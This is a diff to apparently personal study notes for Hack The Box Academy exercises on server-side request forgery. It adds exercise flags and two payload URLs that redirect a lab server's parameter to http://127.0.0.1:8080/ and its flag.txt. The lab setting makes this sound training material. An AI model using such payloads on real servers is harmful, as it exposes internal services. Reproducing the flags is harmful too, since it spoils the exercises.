@@ -18,7 +18,16 @@ Follow the guide.
 **Answer:** `8.0.53`
 
 ---
-## 
+## SSRF Exploitation Example
+### Question:
+![](./attachments/Pasted%20image%2020220724134020.png)
+
+Follow the guide.
+
+**Answer:** `HTB{55rf_2_rc3}`
+
+---
+## Blind SSRF Exploitation Example
 ### Question:
 ![](./attachments/Pasted%20image%2020220712140116.png)
 
@@ -231,7 +240,17 @@ HTB{l33tSk1llsY0uH4ve}
 ### Question:
 ![](./attachments/Pasted%20image%2020220713124356.png)
 
-**Answer:** ``
+![](./attachments/Pasted%20image%2020220724134213.png)
+
+Payload 1:
+`https://138.68.190.93:30982/G3tTh4tF1l34M3?l33t=http://127.0.0.1:8080/`
+
+Payload 2:
+`https://138.68.190.93:30982/G3tTh4tF1l34M3?l33t=http://127.0.0.1:8080/flag.txt`
+
+![](./attachments/Pasted%20image%2020220724134242.png)
+
+**Answer:** `HTB{Th4tW4sL33t1snt1t?}`
 
 ---
 **Tags:** [[Hack The Box Academy]]
